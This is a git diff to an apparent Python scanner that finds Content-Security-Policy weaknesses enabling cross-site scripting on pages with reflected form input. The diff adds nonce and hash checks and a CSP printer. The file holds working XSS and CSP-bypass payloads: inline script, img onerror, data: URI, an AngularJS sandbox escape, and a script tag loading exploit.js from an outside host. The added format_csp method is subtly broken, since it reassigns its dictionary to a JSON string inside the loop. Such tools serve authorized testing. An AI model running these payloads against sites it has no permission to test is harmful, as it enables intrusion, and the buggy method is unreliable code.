@@ -13,9 +13,15 @@ from selenium.webdriver.support.ui import WebDriverWait
 from urllib.parse import urljoin, urlparse
 import argparse
 import datetime
+import json
 import platform
 import re
 import time
+
+color = choice([35, 93, 33])
+
+nonce_reg = r'nonce\-(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'
+sha_reg = r'sha\d{3}\-(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?'
 
 general_payload = "alert()"
 
@@ -25,8 +31,8 @@ policies_fallback = {
 
 vulnerable_CSP_conf = {
     "script-src" : [
-        {'value': ['unsafe-inline'], 'patch':[], 'payload': f'<script>{general_payload}</script>'},
-        {'value': ['unsafe-inline'], 'patch':[], 'payload': f'<img src=# onerror={general_payload}>'},
+        {'value': ['unsafe-inline'], 'patch':[('script-src', nonce_reg), ('script-src', sha_reg)], 'payload': f'<script>{general_payload}</script>'},
+        {'value': ['unsafe-inline'], 'patch':[('script-src', nonce_reg), ('script-src', sha_reg)], 'payload': f'<img src=# onerror={general_payload}>'},
         {'value': ['*'], 'patch':[], 'payload': '<script src="https://0xhorizon.eu/cspass/exploit.js"></script>'},
         {'value': ['data:'], 'patch':[], 'payload': f'<script src="data:,{general_payload}"></script>'},
         {'value':['https://cdnjs.cloudflare.com', 'unsafe-eval'], 'patch':[], 'payload':"<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js\"></script><div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };%s;//');}} </div>" % general_payload},
@@ -130,7 +136,7 @@ class Scanner:
         self.print(f"[\x1b[91mERROR\x1b[0m] {message}")
 
     def banner(self):
-        self.print(f"""\x1b[{choice([35, 93, 33])}m
+        self.print(f"""\x1b[{color}m
            ______ _____  ____                    
           / ____// ___/ / __ \ ____ _ _____ _____
          / /     \__ \ / /_/ // __ `// ___// ___/
@@ -180,12 +186,32 @@ class Page:
                 data[csp_name] = csp_values
         return data
 
+    def format_csp(self):
+        csp = {}
+        for policyname in self.csp:
+            csp[policyname] = " ".join(self.csp[policyname])
+            csp = json.dumps(
+                csp,
+                indent=4
+            )
+        return csp
+
     def get_forms(self):
         r = self.sess.get(self.url, cookies=self.cookies)
         if r.text != "":
             forms = r.html.find("form")
             return forms
         return []
+
+    def test_patch(self, patches):
+        for patch in patches:
+            patch_policy_name = patch[0]
+            patch_policy_value = patch[1]
+            if patch_policy_name in self.csp:
+                r = re.compile(patch_policy_value)
+                if any([r.match(x) for x in self.csp[patch_policy_name]]):
+                    return True
+        return False
 
     def scan(self):
         vuln = False
@@ -202,7 +228,7 @@ class Page:
             name = policyname[1]
             if priority in vulnerable_CSP_conf.keys():
                 for exploit in vulnerable_CSP_conf[priority]:
-                    if all(x in self.csp[name] for x in exploit['value']) and (not all([x in self.csp[name] for x in exploit['patch']]) or exploit['patch'] == []):
+                    if all(x in self.csp[name] for x in exploit['value']) and (exploit['patch'] == [] or not self.test_patch(exploit['patch'])):
                         policyvalue = " ".join(self.csp[name])
                         self.vulns.append({'value':f"{name} {policyvalue}", 'payload':exploit['payload']})
                         vuln = True
@@ -335,6 +361,12 @@ if __name__ == '__main__':
                 if new_form.test_dom():
                     scan.info("Parameter reflected in DOM and no htmlspecialchars detected")
                     if page.csp != {}:
+                        csps = page.format_csp()
+                        scan.print()
+                        scan.print(f" [\x1b[{color}mContent-Security-Policy\x1b[0m] ".center(74, "="))
+                        scan.print(csps)
+                        scan.print(f" [\x1b[{color}mContent-Security-Policy\x1b[0m] ".center(74, "="))
+                        scan.print()
                         if page.scan():
                             vulns = page.vulns
                             scan.info(f"Number of vulnerabilities found: {len(vulns)}\n")
